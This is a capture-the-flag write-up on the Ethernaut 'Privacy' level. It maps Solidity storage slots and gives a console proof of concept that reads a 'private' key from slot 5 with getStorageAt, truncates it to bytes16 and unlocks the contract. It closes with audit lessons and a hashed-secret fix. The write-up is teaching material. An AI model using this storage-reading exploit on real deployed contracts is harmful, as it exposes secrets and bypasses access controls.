---
title: 'Ethernaut - Privacy'
description: 'Reading packed storage slots and fixed-size arrays from the blockchain. Learn how the Solidity compiler packs state variables and how to cast data types to bypass access controls.'
date: 2025-07-12
tags: ['solidity', 'security', 'storage-packing', 'data-privacy', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🕵️ Privacy - Packed Storage Analysis

## Challenge Overview

The goal of this level is to **unlock** the `Privacy` contract.

**The Catch:** The contract is locked, and the `unlock()` function requires us to submit a `bytes16` key. This key is derived from the last element of a `private` array of `bytes32` variables. We must calculate the exact storage slot where the key is located and cast it correctly.

---

## Technical Analysis

### Vulnerability: Public Access to Packed Storage Slots

Like the `Vault` level, the `Privacy` contract incorrectly assumes that declaring a state variable as `private` makes it unreadable to the public. 

To find the key, we must analyze the Solidity storage layout and packing rules:

```solidity
contract Privacy {
    bool public locked = true;                  // Slot 0
    uint256 public ID = block.timestamp;        // Slot 1
    uint8 public flattening = 10;               // Slot 2 (1 byte)
    uint8 public denomination = 255;            // Slot 2 (1 byte)
    uint16 public awkwardness = uint16(t);      // Slot 2 (2 bytes)
    bytes32[3] private data;                    // Slots 3, 4, 5
}
```

#### Storage Slot Mapping
Solidity packs contiguous state variables that require less than 32 bytes into a single slot when possible:
1. **Slot 0**: `locked` (requires 1 byte). The next variable `ID` requires 32 bytes, which cannot fit in the remaining 31 bytes of Slot 0, so it moves to the next slot.
2. **Slot 1**: `ID` (requires 32 bytes). Fills the entire slot.
3. **Slot 2**: `flattening` (1 byte) + `denomination` (1 byte) + `awkwardness` (2 bytes). These total 4 bytes and are packed together in Slot 2.
4. **Slot 3**: `data[0]` (requires 32 bytes).
5. **Slot 4**: `data[1]` (requires 32 bytes).
6. **Slot 5**: `data[2]` (requires 32 bytes).

The key required for unlocking is `data[2]`, which is located in **Slot 5**.

#### Data Type Casting
The `unlock` function expects a `bytes16` value:
```solidity
function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
```
When casting `bytes32` to `bytes16` in Solidity, the value is **truncated** from the right, keeping only the first 16 bytes (32 hex characters after the `0x` prefix).

---

## The Exploit: The Multi-Step Solution

1. **Read Storage Slot 5**: Call `web3.eth.getStorageAt(contractAddress, 5)` to extract the 32-byte value of `data[2]`.
2. **Truncate to 16 Bytes**: Take the first 34 characters of the hex string (the `0x` prefix plus 32 characters representing 16 bytes).
3. **Unlock the Vault**: Call `unlock()` passing the 16-byte hex value.

---

## Proof of Concept (PoC)

Below is the JavaScript console walkthrough:

```javascript
// 1. Read the 32-byte value stored in slot 5
const fullSlotBytes = await web3.eth.getStorageAt(contract.address, 5);
console.log("Full data[2] bytes32:", fullSlotBytes);

// 2. Truncate the 32-byte value to 16 bytes (keep first 34 characters)
const keyBytes16 = fullSlotBytes.substring(0, 34);
console.log("Truncated bytes16 key:", keyBytes16);

// 3. Unlock the contract
await contract.unlock(keyBytes16);

// Verify unlocked state
const isLocked = await contract.locked();
console.log("Is locked?", isLocked);
```

---

## Auditor's Lessons

1. **Explicit Storage Layout Audits**: Auditors must be adept at mapping storage slots manually to identify data exposure vectors. Tools like Slither and Mythril can automate storage layout mapping.
2. **Zero Privacy modifiers**: Visibility modifiers (`private`, `internal`) only govern compilation checks. Never store plain text secret codes or keys in blockchain storage.
3. **Casting Truncation Hazards**: Understand the behavior of explicit casts in Solidity. Casting from larger to smaller fixed-size byte types truncates data, which can introduce subtle bugs or unexpected collisions.

---

## Remediation

Remove the secret verification from storage. Use a cryptographic verification mechanism like signatures, Merkle trees, or hashed proofs:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecurePrivacy {
    bool public locked = true;
    bytes32 public immutable hashedSecret; // Publicly visible hash

    constructor(bytes32 _hashedSecret) {
        hashedSecret = _hashedSecret;
    }

    // Pass the secret value, hashing it on-chain to verify
    function unlock(string calldata _secret) external {
        require(keccak256(abi.encodePacked(_secret)) == hashedSecret, "Wrong secret!");
        locked = false;
    }
}
```
